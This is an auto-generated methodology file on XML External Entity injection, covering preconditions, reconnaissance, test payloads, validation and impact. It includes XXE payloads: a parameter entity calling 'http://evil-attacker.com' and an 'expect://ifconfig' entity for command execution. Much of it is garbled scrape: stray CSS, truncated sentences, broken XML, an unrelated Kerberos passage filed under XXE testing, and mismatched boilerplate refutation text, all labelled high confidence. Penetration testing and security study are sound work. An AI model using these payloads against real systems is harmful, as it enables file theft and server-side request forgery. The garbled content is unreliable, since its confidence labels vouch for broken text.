# Methodology — XML External Entity Injection

> Derived from 16 verified items. Regenerate with `python -m wks.methodgen --class xxe --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** An XML parser resolves external or entity-expanded content the attacker controls.

**References.** CWE-611 · A05:2021

## 1. Preconditions

_Nothing below is reachable until these hold. Confirm each against the target before spending time on the technique._

**XXE arises because the XML specification includes DTD and external-entity features that standard XML parsers support even when the application does not intend to use them.**

Applications that transmit data in XML do so through standard library or platform APIs to parse it, and those parsers support DTD and external-entity features the application does not need. XXE occurs when untrusted XML is processed with document type definitions and external entity resolution enabled. The OWASP cheat sheet confirms this attack could be used to stage multiple incidents, including a denial of service, a Server Side Request Forgery (SSRF) attack, the ability to scan ports from the machine where the parser is located, and other system impacts. The safest mitigation across every parser instance is to disable DTDs (external entities) completely.

- *Disproof:* A parser configured with DOCTYPE and external-entity resolution completely disabled cannot be exploited by XXE; the OWASP cheat sheet states that the safest way to prevent XXE is always to disable DTDs (external entities) completely.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/xxe)

## 2. Reconnaissance signals

_What to look for while mapping the surface, and where each signal tells you the rest of the procedure is worth running._

**A parser that accepts a DOCTYPE declaration and resolves its entity is the enabling condition for XXE; the submitted payload alone proves nothing.**

Submit a minimal document with an internal DTD declaring one entity and referencing it, and observe whether the parser expands it. Acceptance of the DOCTYPE plus expansion shows the parser is processing declarations rather than rejecting them wholesale. This is the signal to escalate to; a rejected DOCTYPE ends the investigation for that endpoint.

- *Disproof:* If the parser rejects the DOCTYPE outright or returns a parse error, entity processing is disabled and the XXE signal is absent.
- *Evidence:* high_confidence — [snyk.io](https://snyk.io/blog/nokogiri-xxe-vulnerabilities/); [w3.org](https://www.w3.org/TR/2008/REC-xml-20081126/)

**An attacker-controlled out-of-band callback plus entity-derived data arriving on the error channel in the same probe is the positive confirmation that external entity resolution succeeded, not merely that the parser tolerated a DOCTYPE.**

An attacker-controlled out-of-band callback plus entity-derived data arriving on the error channel in the same probe is the positive confirmation that external entity resolution succeeded, not merely that the parser tolerated a DOCTYPE.

HackTricks reference: XXE - XEE - XML External Entity (pentesting-web/xxe-xee-xml-external-entity.md)

- *Disproof:* Refuted if the out-of-band endpoint never receives a request or the error channel returns no entity-derived data, since a clean rejection or a DOCTYPE-only parse produces neither.
- *Evidence:* high_confidence — [lxml.de](https://lxml.de/parsing.html); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xxe-xee-xml-external-entity.md)

## 3. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**XML external entity injection is provable by defining an entity that expands to a known local file and observing that content in the response.**

In practice on HTB this shows up as: - The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.
When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.
If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

Write-up provenance: ajcriado/htb-writeups :: Cheatsheets/Mix-OSCP-CPTS/Windows/3. Lateral Movement.md (4337 words, classified network).

- *Disproof:* Refuted when a DOCTYPE declaring external entities is rejected by the parser, so the entity is never expanded.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/611.html); [portswigger.net](https://portswigger.net/web-security/xxe); [raw.githubusercontent.com](https://raw.githubusercontent.com/ajcriado/htb-writeups/main/Cheatsheets/Mix-OSCP-CPTS/Windows/3.%20Lateral%20Movement.md)

**The risk lives in how the parser resolves external data sources, so the probe is a document that carries a DOCTYPE and an entity declaration; parameter entities are the escalation path once a plain external entity is refused.**

The risk lives in how the parser resolves external data sources, so the probe is a document that carries a DOCTYPE and an entity declaration; parameter entities are the escalation path once a plain external entity is refused.

HackTricks reference: XXE - XEE - XML External Entity (pentesting-web/xxe-xee-xml-external-entity.md)

- *Disproof:* Refuted if the parser rejects the DOCTYPE outright, or resolves internal entities only and never attempts to retrieve the external identifier - there is then no external resolution to test.
- *Evidence:* high_confidence — [lxml.de](https://lxml.de/parsing.html); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xxe-xee-xml-external-entity.md)

**Data retrieval The most common XXE injection vulnerability lets attackers prompt a server to disclose sensitive data or files in an HTTP response.**

serious cases, attackers can commit a server-side request forgery , which lets them impersonate a server on their target’s network and may enable them to execute code remotely. This enables them to escalate their privileges to traverse their target’s infrastructure and attack other unprotected components — or propagate attacks appearing to originate from their target to other networks downstream. Data retrieval The most common XXE injection vulnerability lets attackers prompt a server to disclose sensitive data or files in an HTTP response. In isolation, this gives an attacker read-only access to data, but it can reveal information useful for escalating to a more damaging attack. For example, an attacker can send a payload to a target server to cause the target server to display a local password file: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Data retrieval The most common XXE injection vulnerability lets attackers prompt”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [bishopfox.com](https://bishopfox.com/blog/phpspreadsheet-versions1.5.0-xxe-advisory); [snyk.io](https://snyk.io/blog/find-and-fix-xml-entity-vulnerabilities/)

**Error-based information disclosure Our server is vulnerable to blind XXE injection methods if an attacker can retrieve valuable data by examining the error messages our server emits.**

none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE foo 
 3 [ 
 4 ENTITY % xxe SYSTEM "http://evil-attacker.com" > % xxe ; 
 5 ]> In this code, the targeted server will try to send the HTTP request to the attacker’s server URL. As a result, the attacker can perform the DNS lookup of the target server using this blind XXE attack. Error-based information disclosure Our server is vulnerable to blind XXE injection methods if an attacker can retrieve valuable data by examining the error messages our server emits. For example, this payload coerces our server to disclose a /etc/pÃ¢sswd file in its error message: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the scrollable area. A scroll container drops its
 end-side padding once content overflows, leaving long lines flush
 against the right edge when scrolled. */
 padding: 0;

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Error-based information disclosure Our server is vulnerable to blind XXE injecti”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [snyk.io](https://snyk.io/blog/find-and-fix-xml-entity-vulnerabilities/); [w3.org](https://www.w3.org/TR/2008/REC-xml-20081126/)

**In a server-side request forgery (SSRF) attack, an attacker will typically inject a URL or address pointing to the vulnerable server’s local file system instance or other restricted-access resources — especially when user inputs are not properly filtered by the XML parser.**

l be used to encrypt and decrypt your data. Furthermore, disabling the XML parser’s default support for external entities is an effective mitigation strategy against this kind of attack. Server-side request forgery A server vulnerable to XXE injection presents an opportunity for an attacker to impersonate the server and make requests to internal resources not normally visible outside the network. In a server-side request forgery (SSRF) attack, an attacker will typically inject a URL or address pointing to the vulnerable server’s local file system instance or other restricted-access resources — especially when user inputs are not properly filtered by the XML parser. They can then obtain credentials and gain administrative privileges within their target’s network: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the scrollable area. A scroll container drops its
 end-side padding once content overflows, leaving long lines flush
 against the right edge when scrolled. */
 padding: 0;

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“In a server-side request forgery (SSRF) attack, an attacker will typically injec”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [snyk.io](https://snyk.io/blog/find-and-fix-xml-entity-vulnerabilities/); [w3.org](https://www.w3.org/TR/2008/REC-xml-20081126/)

**9 userInfo > The ifconfig command in this example returns the server’s network configuration when the XML parser evaluates the xxe entity.**

em, max-content) minmax(0, 1fr);
 column-gap: 1rem;
}

.shiki-code-block__line-number {
 color: #505050;
 text-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE userInfo 
 3 [ 
 4 ENTITY xxe SYSTEM "expect://ifconfig" > 
 5 ]> 
 6 userInfo > 
 7 username > &xxe; username > 
 8 email > email email > 
 9 userInfo > The ifconfig command in this example returns the server’s network configuration when the XML parser evaluates the xxe entity. We can prevent RCE by selectively disabling protocol wrappers, such as the Expect PHP extension, in our websites or web apps. However, even in cases where there are no avenues of receiving a direct response from the server, an attacker can use blind XXE methods instead. Blind XXE attacks In some cases, XML parsers may prevent entity declarations in the body of the XML documents. An attacker can b

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“9 userInfo > The ifconfig command in this example returns the server’s network c”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [snyk.io](https://snyk.io/blog/find-and-fix-xml-entity-vulnerabilities/); [w3.org](https://www.w3.org/TR/2008/REC-xml-20081126/)

**However, if a user were to set the DTDLOAD option to true and also set the NONET option to false, then the vulnerability is open to be exploited by any malicious attackers.**

option is set, then no unknown documents can be loaded from the network. For versions of Nokogiri greater than 1.5.4 the default configuration has the DTDLOAD option set to false , and the NONET option set to true . In other words, by default, Nokogiri will not attempt to load any DTD’s defined, and will also not load documents over the network — which means the vulnerability cannot be exploited. However, if a user were to set the DTDLOAD option to true and also set the NONET option to false, then the vulnerability is open to be exploited by any malicious attackers. How to remediate The issues were discovered by the Snyk security research team and disclosed to Nokogiri on January 11th. The Nokogiri team quickly triaged the issue , but unfortunately in this case Nokogiri is sort of stuck. The issue isn’t with Nokogiri itself, but with the underlying libxml2 library. Nokogiri is waiting for them to patch the issue so that they can update accordingly. In the me

- *Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“However, if a user were to set the DTDLOAD option to true and also set the NONET”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [bishopfox.com](https://bishopfox.com/blog/phpspreadsheet-versions1.5.0-xxe-advisory); [snyk.io](https://snyk.io/blog/nokogiri-xxe-vulnerabilities/); [w3.org](https://www.w3.org/TR/2008/REC-xml-20081126/)

**Why XXE represents a security risk XXE injection attacks let attackers take advantage of external entity declarations to gain access to files or infrastructure on their target server or network.**

t-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ENTITY name "Taylor Gray" > Combined with XML’s simple syntax and the uniformity of most parsers, this capability makes it relatively simple for attackers to perform an attack called XML external entity (XXE) injection . In this post, we’re going to take a close look at XXE and explore ways to prevent it. Why XXE represents a security risk XXE injection attacks let attackers take advantage of external entity declarations to gain access to files or infrastructure on their target server or network. This can include sensitive personal information, business logic, and credentials. In serious cases, attackers can commit a server-side request forgery , which lets them impersonate a server on their target’s network and may enable them to execute code remotely. This enables them to escalate their privileges to traverse their target’s infrastructure and attack other unprotected components — or pro

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Why XXE represents a security risk XXE injection attacks let attackers take adva”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [bishopfox.com](https://bishopfox.com/blog/phpspreadsheet-versions1.5.0-xxe-advisory); [snyk.io](https://snyk.io/blog/find-and-fix-xml-entity-vulnerabilities/)

## 4. Validation

_How to prove the finding rather than infer it. A technique that cannot be validated must not be reported._

**An XXE is proved by the parser resolving an external reference to a resource the submitted document never contained — a request the server issued to an attacker-controlled listener, or file content appearing that only exists on the host — because that is the observable effect entity resolution causes.**

Mechanism: An XXE is proved by the parser resolving an external reference to a resource the submitted document never contained — a request the server issued to an attacker-controlled listener, or file content appearing that only exists on the host — because that is the observable effect entity resolution causes. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The claim is false when the environment blocks resolution so the payload produces a silent parse error or empty result with no outbound request; in that case the finding is a configuration weakness established by the parser defaults rather than a live XXE, and it must be reported as such instead of as a demonstrated read.

- *Disproof:* The claim is false when the environment blocks resolution so the payload produces a silent parse error or empty result with no outbound request; in that case the finding is a configuration weakness established by the parser defaults rather than a live XXE, and it must be reported as such instead of as a demonstrated read.
- *Evidence:* high_confidence — [lxml.de](https://lxml.de/FAQ.html); [php.net](https://www.php.net/manual/en/function.simplexml-load-string.php)

**An XXE finding is validated only when an inbound HTTP request to the supplied entity URL was actually observed on a listener you control.**

Stand up a listener and treat any inbound GET as the only acceptable proof that resolution occurred. Re-run twice to exclude transient failures, and record the timestamp, requested path and source address. The callback is what separates a real finding from a payload that merely appeared in a request body, and it is evidence an operator can independently reproduce.

- *Disproof:* No inbound request to the entity URL means entity resolution did not occur and the XXE finding is not reproducible, no matter how alarming the submitted payload looked.
- *Evidence:* high_confidence — [bishopfox.com](https://bishopfox.com/blog/phpspreadsheet-versions1.5.0-xxe-advisory); [snyk.io](https://snyk.io/blog/nokogiri-xxe-vulnerabilities/)

## False-positive rejection

_No verified fp_rule items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Known bypasses

_No verified bypass items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Chaining

_No verified chain_link items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 5. Impact

_What is actually demonstrable, and what to stop claiming._

**XXE external entities that use http:// URIs force the server to make outbound requests, enabling SSRF against internal systems, internal port scanning, and use of the server's trust relationship to bypass firewalls.**

Aside from file retrieval, the main impact of XXE is SSRF: by defining an external entity with a URL you want to target and referencing it in a data value, you gain two-way interaction with the back-end system when the entity is reflected; otherwise you can still perform blind SSRF. CWE-611 states that a crafted DTD using URIs with schemes such as http:// forces the application to make outgoing HTTP requests to servers the attacker cannot reach directly, which can bypass firewall restrictions, hide the source of attacks such as port scanning, or otherwise leverage the server's trust relationship with other entities.

- *Disproof:* If the parser refuses HTTP(S) external entities and disables file:// entities, or the server lacks outbound network access, the SSRF impact is not exploitable; and if responses to the triggered requests are not observable, blind SSRF becomes a harder signal that requires out-of-band detection.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/611.html); [portswigger.net](https://portswigger.net/web-security/xxe)

## Coverage gap

These stages have no verified evidence and are therefore absent above: False-positive rejection, Known bypasses, Chaining.
A procedure with a missing validation stage is not safe to act on — it produces findings rather than proofs.

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
